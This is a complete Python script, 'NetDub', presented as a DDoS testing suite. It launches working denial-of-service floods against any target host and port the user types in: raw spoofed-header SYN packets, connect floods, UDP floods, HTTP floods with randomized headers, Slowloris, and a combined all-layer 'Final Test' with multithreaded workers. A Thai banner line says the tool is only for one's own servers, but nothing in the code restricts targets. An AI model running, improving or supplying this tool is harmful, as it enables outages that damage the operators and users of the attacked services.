#!/usr/bin/env python3
import asyncio
import socket
import threading
import time
import random
import struct
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init, Style
import multiprocessing

# Initialize colorama
init()

class NetDub:
    def __init__(self):
        self.target_host = None
        self.target_ip = None
        self.target_port = None
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'pps': 0
        }
        
        # User agents for HTTP attacks
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        
        # HTTP methods for stress testing
        self.http_methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
        
        # Check if running as root
        self.is_root = os.geteuid() == 0
        
    def banner(self):
        """Display banner"""
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.RED}║                        NetDub v2.0                          ║{Fore.RESET}")
        print(f"{Fore.RED}║                 Advanced DDoS Testing Suite                 ║{Fore.RESET}")
        print(f"{Fore.RED}║                    Final Test Edition                       ║{Fore.RESET}")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}")
        print(f"{Fore.YELLOW}⚠️  เพื่อการทดสอบความปลอดภัยเท่านั้น - ใช้กับเซิร์ฟเวอร์ตัวเองเท่านั้น{Fore.RESET}")
        print(f"{Fore.CYAN}Root privileges: {Fore.GREEN if self.is_root else Fore.RED}{'✓' if self.is_root else '✗'}{Fore.RESET}")
        print()
        
    def resolve_target(self, host):
        """Resolve hostname to IP"""
        try:
            self.target_ip = socket.gethostbyname(host)
            print(f"{Fore.GREEN}[✓] Resolved {host} → {self.target_ip}{Fore.RESET}")
            return True
        except socket.gaierror:
            print(f"{Fore.RED}[✗] Failed to resolve {host}{Fore.RESET}")
            return False
    
    def check_target(self):
        """Check if target is reachable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result == 0:
                print(f"{Fore.GREEN}[✓] Target {self.target_ip}:{self.target_port} is reachable{Fore.RESET}")
                return True
            else:
                print(f"{Fore.RED}[✗] Target {self.target_ip}:{self.target_port} is not reachable{Fore.RESET}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[✗] Connection test failed: {e}{Fore.RESET}")
            return False
    
    def update_stats(self, packets=0, connections=0, bytes_sent=0):
        """Update statistics"""
        self.stats['packets_sent'] += packets
        self.stats['connections_made'] += connections
        self.stats['bytes_sent'] += bytes_sent
        
        if self.stats['start_time'] > 0:
            elapsed = time.time() - self.stats['start_time']
            self.stats['pps'] = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
    
    def display_stats(self):
        """Display real-time statistics"""
        while self.running:
            elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] > 0 else 0
            
            print(f"\r{Fore.CYAN}[STATS] {Fore.GREEN}Packets: {self.stats['packets_sent']:,} | "
                  f"PPS: {self.stats['pps']:,.0f} | "
                  f"Connections: {self.stats['connections_made']:,} | "
                  f"Data: {self.stats['bytes_sent'] / 1024 / 1024:.1f}MB | "
                  f"Time: {elapsed:.0f}s{Fore.RESET}", end='', flush=True)
            
            time.sleep(1)
    
    # ============ LAYER 3 ATTACKS ============
    def raw_packet_flood(self, intensity=1000):
        """Layer 3 - Raw packet flood (requires root)"""
        if not self.is_root:
            print(f"{Fore.RED}[!] Raw packet flood requires root privileges{Fore.RESET}")
            return
        
        print(f"{Fore.YELLOW}[*] Starting Layer 3 Raw Packet Flood...{Fore.RESET}")
        
        def flood_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                while self.running:
                    # Create raw TCP packet
                    packet = self.create_tcp_packet()
                    
                    for _ in range(intensity):
                        if not self.running:
                            break
                        try:
                            sock.sendto(packet, (self.target_ip, self.target_port))
                            self.update_stats(packets=1, bytes_sent=len(packet))
                        except:
                            pass
                    
                    time.sleep(0.001)  # Small delay
                    
            except Exception as e:
                print(f"{Fore.RED}[!] Raw packet error: {e}{Fore.RESET}")
        
        # Start multiple threads
        threads = []
        for _ in range(multiprocessing.cpu_count() * 2):
            t = threading.Thread(target=flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def create_tcp_packet(self):
        """Create a raw TCP packet"""
        # IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               69,  # Version & IHL
                               0,   # TOS
                               40,  # Total length
                               random.randint(1, 65535),  # ID
                               0,   # Flags & Fragment offset
                               64,  # TTL
                               6,   # Protocol (TCP)
                               0,   # Header checksum
                               socket.inet_aton('127.0.0.1'),  # Source IP
                               socket.inet_aton(self.target_ip))  # Dest IP
        
        # TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                                random.randint(1024, 65535),  # Source port
                                self.target_port,  # Dest port
                                random.randint(1, 4294967295),  # Sequence
                                0,  # Acknowledgment
                                80,  # Header length & flags
                                2,   # SYN flag
                                65535,  # Window size
                                0,   # Checksum
                                0)   # Urgent pointer
        
        return ip_header + tcp_header
    
    # ============ LAYER 4 ATTACKS ============
    def syn_flood(self, intensity=2000):
        """Layer 4 - SYN flood attack"""
        print(f"{Fore.YELLOW}[*] Starting Layer 4 SYN Flood...{Fore.RESET}")
        
        def syn_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    
                    for _ in range(intensity):
                        if not self.running:
                            break
                        try:
                            sock.connect((self.target_ip, self.target_port))
                            sock.close()
                            self.update_stats(packets=1, connections=1)
                        except:
                            self.update_stats(packets=1)
                            pass
                    
                except Exception:
                    pass
        
        # Start multiple threads
        threads = []
        for _ in range(multiprocessing.cpu_count() * 4):
            t = threading.Thread(target=syn_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def udp_flood(self, intensity=3000):
        """Layer 4 - UDP flood attack"""
        print(f"{Fore.YELLOW}[*] Starting Layer 4 UDP Flood...{Fore.RESET}")
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'A' * 1024  # 1KB payload
            
            while self.running:
                for _ in range(intensity):
                    if not self.running:
                        break
                    try:
                        sock.sendto(payload, (self.target_ip, self.target_port))
                        self.update_stats(packets=1, bytes_sent=len(payload))
                    except:
                        pass
                time.sleep(0.001)
        
        # Start multiple threads
        threads = []
        for _ in range(multiprocessing.cpu_count() * 3):
            t = threading.Thread(target=udp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    # ============ LAYER 7 ATTACKS ============
    def http_flood(self, intensity=500):
        """Layer 7 - HTTP flood attack"""
        print(f"{Fore.YELLOW}[*] Starting Layer 7 HTTP Flood...{Fore.RESET}")
        
        def http_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_ip, self.target_port))
                    
                    for _ in range(intensity):
                        if not self.running:
                            break
                        
                        method = random.choice(self.http_methods)
                        path = f"/{random.randint(1, 999999)}"
                        user_agent = random.choice(self.user_agents)
                        
                        request = f"{method} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.target_host}\r\n"
                        request += f"User-Agent: {user_agent}\r\n"
                        request += "Connection: keep-alive\r\n"
                        request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                        request += "\r\n"
                        
                        try:
                            sock.send(request.encode())
                            self.update_stats(packets=1, bytes_sent=len(request))
                        except:
                            break
                    
                    sock.close()
                    self.update_stats(connections=1)
                    
                except Exception:
                    pass
        
        # Start multiple threads
        threads = []
        for _ in range(multiprocessing.cpu_count() * 6):
            t = threading.Thread(target=http_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        return threads
    
    def slowloris_attack(self, connections=1000):
        """Layer 7 - Slowloris attack"""
        print(f"{Fore.YELLOW}[*] Starting Layer 7 Slowloris...{Fore.RESET}")
        
        sockets = []
        
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial HTTP request
                request = f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                
                sock.send(request.encode())
                return sock
            except:
                return None
        
        def slowloris_worker():
            # Create initial connections
            for _ in range(connections):
                if not self.running:
                    break
                sock = create_socket()
                if sock:
                    sockets.append(sock)
                    self.update_stats(connections=1)
            
            # Maintain connections
            while self.running:
                for sock in sockets[:]:
                    try:
                        header = f"X-a: {random.randint(1, 5000)}\r\n"
                        sock.send(header.encode())
                        self.update_stats(packets=1, bytes_sent=len(header))
                    except:
                        sockets.remove(sock)
                        new_sock = create_socket()
                        if new_sock:
                            sockets.append(new_sock)
                            self.update_stats(connections=1)
                
                time.sleep(10)
        
        t = threading.Thread(target=slowloris_worker)
        t.daemon = True
        t.start()
        
        return [t]
    
    def show_menu(self):
        """Display attack menu"""
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.CYAN}║                        Attack Menu                          ║{Fore.RESET}")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣{Fore.RESET}")
        print(f"{Fore.CYAN}║ 1. เบาๆ       - HTTP Flood (Layer 7)                       ║{Fore.RESET}")
        print(f"{Fore.CYAN}║ 2. ปานกลาง    - SYN Flood (Layer 4)                        ║{Fore.RESET}")
        print(f"{Fore.CYAN}║ 3. แรง        - UDP Flood (Layer 4)                         ║{Fore.RESET}")
        print(f"{Fore.CYAN}║ 4. แรงมาก     - Multi-Layer Attack                          ║{Fore.RESET}")
        print(f"{Fore.CYAN}║ 5. สุดโต่ง     - Raw Packet Flood (Layer 3) [Root]         ║{Fore.RESET}")
        print(f"{Fore.CYAN}║ 6. Slowloris  - Slow HTTP Attack                           ║{Fore.RESET}")
        print(f"{Fore.CYAN}║ 7. Final Test - All Layers Combined (1.2M+ PPS)            ║{Fore.RESET}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}")
        
    def final_test(self):
        """Ultimate test - All layers combined"""
        print(f"{Fore.RED}[!] Starting Final Test - Maximum Impact Attack{Fore.RESET}")
        print(f"{Fore.RED}[!] Target: {self.target_ip}:{self.target_port}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Launching all attack vectors...{Fore.RESET}")
        
        all_threads = []
        
        # Layer 7 attacks
        all_threads.extend(self.http_flood(intensity=1000))
        all_threads.extend(self.slowloris_attack(connections=2000))
        
        # Layer 4 attacks
        all_threads.extend(self.syn_flood(intensity=5000))
        all_threads.extend(self.udp_flood(intensity=8000))
        
        # Layer 3 attacks (if root)
        if self.is_root:
            all_threads.extend(self.raw_packet_flood(intensity=10000))
        
        print(f"{Fore.GREEN}[✓] All attack vectors launched ({len(all_threads)} threads){Fore.RESET}")
        print(f"{Fore.RED}[!] Expected PPS: 1,200,000+{Fore.RESET}")
        
        return all_threads
    
    def run(self):
        """Main execution"""
        self.banner()
        
        # Get target information
        self.target_host = input(f"{Fore.GREEN}🌐 Enter target (domain/IP): {Fore.RESET}").strip()
        self.target_port = int(input(f"{Fore.GREEN}🔌 Enter port: {Fore.RESET}").strip())
        
        print()
        
        # Resolve and check target
        if not self.resolve_target(self.target_host):
            return
        
        if not self.check_target():
            return
        
        print()
        self.show_menu()
        
        choice = input(f"{Fore.GREEN}Select attack type (1-7): {Fore.RESET}").strip()
        
        print()
        
        # Start statistics thread
        self.stats['start_time'] = time.time()
        self.running = True
        
        stats_thread = threading.Thread(target=self.display_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Launch selected attack
        try:
            if choice == '1':
                threads = self.http_flood(intensity=300)
            elif choice == '2':
                threads = self.syn_flood(intensity=1000)
            elif choice == '3':
                threads = self.udp_flood(intensity=2000)
            elif choice == '4':
                threads = []
                threads.extend(self.http_flood(intensity=500))
                threads.extend(self.syn_flood(intensity=2000))
                threads.extend(self.udp_flood(intensity=3000))
            elif choice == '5':
                threads = self.raw_packet_flood(intensity=5000)
            elif choice == '6':
                threads = self.slowloris_attack(connections=800)
            elif choice == '7':
                threads = self.final_test()
            else:
                print(f"{Fore.RED}[!] Invalid choice{Fore.RESET}")
                return
            
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop...{Fore.RESET}")
            
            # Wait for threads
            for thread in threads:
                thread.join()
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack stopped by user{Fore.RESET}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {e}{Fore.RESET}")
        finally:
            self.running = False
            print(f"\n{Fore.GREEN}[✓] Attack completed{Fore.RESET}")
            print(f"{Fore.CYAN}[*] Final stats: {self.stats['packets_sent']:,} packets sent in {time.time() - self.stats['start_time']:.0f}s{Fore.RESET}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print("NetDub - Advanced DDoS Testing Suite")
        print("Usage: sudo python3 netdub.py")
        print("Note: Some attacks require root privileges")
        sys.exit(0)
    
    netdub = NetDub()
    netdub.run()
